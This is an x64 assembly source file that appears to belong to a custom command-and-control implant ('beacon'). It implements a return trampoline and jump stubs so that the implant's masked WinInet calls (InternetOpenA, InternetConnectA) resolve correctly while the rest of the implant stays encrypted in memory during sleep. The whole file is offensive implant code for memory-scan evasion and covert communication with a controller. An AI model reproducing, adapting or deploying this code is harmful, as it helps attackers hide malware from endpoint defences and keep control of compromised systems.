; gate_tramp.asm - return trampoline for BeaconGate's masked calls (x64 MASM)
;
; A callee may resolve its caller by return address. WinInet does - it hands
; the address to GetModuleHandleEx(FROM_ADDRESS) -> RtlPcToFileHeader, which
; on current Windows only resolves image mappings. The mask engine's stubs
; (sleepmask_bofwin.cpp) live on a private page, so a call made from there
; resolves to nothing and InternetOpenA hands back a bogus handle. A masked
; call therefore returns HERE first - 16 bytes of executable section inside
; the beacon image - and jumps on to the stub:
;
;   gated_tramp:    jmp qword ptr gated_target
;   gated_target:   dq <stub page: the call thunk's `after`>
;
; sleepmask_bofwin.cpp fills gated_target at engine build and keeps this
; section out of the mask. Nothing else of the beacon is in the clear while
; a masked call runs.
;
; A user sleepmask (the 4.10+ object) runs the calls it is handed from its
; own memory, where the same lookup fails for every call - the two comms
; calls included, masked or not. Those are handed over as these stubs
; instead (beacon_gate.cpp gate_comms_stub), which jump on to the real API:
;
;   gated_comms+0x00:  jmp qword ptr [rip+2]   ; slot at +8: InternetOpenA
;   gated_comms+0x10:  jmp qword ptr [rip+2]   ; slot at +8: InternetConnectA
;
; The section stays executable: beacon_info_fill leaves it MaskSection
; FALSE, so a kit-conformant mask does not touch it.

gtramp SEGMENT ALIGN(16) 'CODE'

PUBLIC  gated_tramp
gated_tramp PROC
        jmp     qword ptr gated_target      ; FF 25 disp32: rip-relative through the slot
gated_tramp ENDP

PUBLIC  gated_target
ALIGN   8
gated_target DQ 0

PUBLIC  gated_comms
ALIGN   16
gated_comms LABEL BYTE
        DB      0FFh, 25h, 02h, 00h, 00h, 00h, 00h, 00h      ; InternetOpenA: jmp qword ptr [rip+2]
        DQ      0                                               ; +8: the API
        DB      0FFh, 25h, 02h, 00h, 00h, 00h, 00h, 00h      ; InternetConnectA (+16)
        DQ      0                                               ; +24: the API

gtramp ENDS

END
